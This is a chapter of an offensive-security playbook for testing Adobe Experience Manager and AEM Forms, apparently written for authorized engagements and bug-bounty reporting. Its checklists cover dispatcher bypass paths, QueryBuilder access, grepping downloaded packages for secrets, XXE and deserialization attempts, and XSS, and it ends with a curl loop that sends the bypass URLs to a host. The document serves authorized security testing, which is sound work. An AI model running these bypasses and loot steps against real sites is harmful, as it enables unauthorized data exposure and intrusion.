# 10 — Engagement playbooks (copy the order)

Replace `TARGET`. Authorized only.  
When a step fails in 5–10 minutes → **skip**, don’t spiral.

---

## Playbook A — Brand new host (30–60 min)

```text
[ ] 1. Fingerprint AEM + Forms          → 02
[ ] 2. Find one /content/... page path
[ ] 3. Try .1.json / .3.json on page + /content
[ ] 4. Direct QueryBuilder              → 04 kit A
[ ] 5. Semicolon + css/js/png bypasses  → 04 kit B
[ ] 6. GraphQL + hybrid bypass          → 04 kit C
[ ] 7. form selector suffix             → 04 kit E / 06
[ ] 8. If any JSON API works → loot     → 05 + 07
[ ] 9. Selector XSS gadgets quick pass  → 06
[ ] 10. Forms paths if any              → 08
[ ] 11. Notes + screenshots for report
```

**Minimum reportable wins:** info disclosure via JSON, package leak, stored secret, XSS, unauth admin surface.

---

## Playbook B — QueryBuilder is open (15–40 min)

```text
[ ] path=/content  p.limit=50
[ ] path=/etc/packages
[ ] path=/home
[ ] fulltext=password / secret / api
[ ] Download packages → grep secrets
[ ] Map internal hostnames from content
[ ] Check writable nodes if policy allows
```

---

## Playbook C — Everything 404s at dispatcher (45–90 min)

```text
[ ] Collect 20 public /content URLs from site crawl
[ ] For each of 3 representative pages:
      .1.json .infinity.json
      .rawcontent.html
      .listParagraphs.html?itemResourceType=about.jsp
      .form.css/bin/querybuilder.json?...
[ ] GraphQL nocanon + hybrid on querybuilder
[ ] ffuf small mutation list (04)
[ ] If still dead: author.* subdomain recon
[ ] Forms standalone ports/hosts in scope?
```

---

## Playbook D — You have low-priv author login

```text
[ ] Re-test QueryBuilder / packmgr as user
[ ] List /etc/packages with auth
[ ] Try package upload (XXE) carefully
[ ] Search for custom selectors in packages
[ ] XSS in components (HTL @context=unsafe, JSP)
[ ] Modern cloudsettings write if present (09)
```

---

## Playbook E — AEM Forms standalone smell

```text
[ ] /lc/... login, /FormServer, /adminui, /edcws
[ ] Version / patch notes vs CVE-2025-* 
[ ] Deser / XXE / Struts only if RCE in scope
[ ] Prefer OOB proofs first
[ ] Recommend “don’t expose Forms to internet” in report
```

---

## Playbook F — 10-minute smoke (triage many hosts)

```bash
T="https://TARGET"
for p in \
  "/libs/granite/core/content/login.html" \
  "/etc.clientlibs/" \
  "/bin/querybuilder.json?path=/content&p.limit=1" \
  "/bin/querybuilder.json;x='a/b.css/c'?path=/content&p.limit=1" \
  "/graphql/execute.json/..%2f../bin/querybuilder.json?path=/content&p.limit=1" \
  "/content.1.json" \
  "/etc/packages.1.json" \
  "/FormServer/" \
  "/adminui/"
do
  code=$(curl -sk -o /tmp/o -w "%{http_code}" --max-time 8 "$T$p")
  size=$(wc -c </tmp/o)
  echo "$code $size $p"
done
```

Queue anything with **200 + juicy size** for deep playbooks.

---

## Decision tree

```text
Is login.html or clientlibs AEM?
  no  → stop AEM kit
  yes → QueryBuilder direct?
          yes → Playbook B
          no  → bypasses work?
                  yes → Playbook B
                  no  → Playbook C
Forms paths?
  yes → Playbook E in parallel
```

---

## Report writing cheatsheet (simple)

| You proved | Severity intuition |
|------------|-------------------|
| Anon QueryBuilder full tree | High (data exposure) |
| Package with creds/source | Critical/High |
| XSS unauth on main site | Medium/High (context) |
| SSRF full read | High |
| RCE Forms/deser | Critical |
| Dispatcher bypass alone | Often Informational unless chained to data |

Always show: **request, response snippet, business data impact**.

---

Back to index: [README.md](./README.md)
